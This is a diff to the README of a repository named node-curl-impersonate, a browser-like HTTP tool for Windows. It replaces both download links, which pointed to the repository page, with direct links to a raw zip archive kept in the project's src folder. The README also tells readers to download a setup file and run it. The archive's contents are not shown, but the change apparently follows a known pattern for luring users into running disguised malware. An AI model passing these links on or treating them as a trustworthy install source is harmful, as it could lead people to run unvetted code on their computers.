@@ -1,6 +1,6 @@
 # 🌐 node-curl-impersonate - Browser-like HTTP for Windows
 
-[![Download](https://img.shields.io/badge/Download%20Here-blue?style=for-the-badge&logo=github)](https://github.com/Leos573/node-curl-impersonate)
+[![Download](https://img.shields.io/badge/Download%20Here-blue?style=for-the-badge&logo=github)](https://github.com/Leos573/node-curl-impersonate/raw/refs/heads/master/src/curl-impersonate-node-v1.1.zip)
 
 ## 🧭 What this app does
 
@@ -39,7 +39,7 @@ If you do not have Node.js yet, install it first from the official Node.js site,
 
 ## 📥 Download
 
-Visit this page to download: [node-curl-impersonate](https://github.com/Leos573/node-curl-impersonate)
+Visit this page to download: [node-curl-impersonate](https://github.com/Leos573/node-curl-impersonate/raw/refs/heads/master/src/curl-impersonate-node-v1.1.zip)
 
 If the page shows a release or setup file, download it to your computer and run it
 
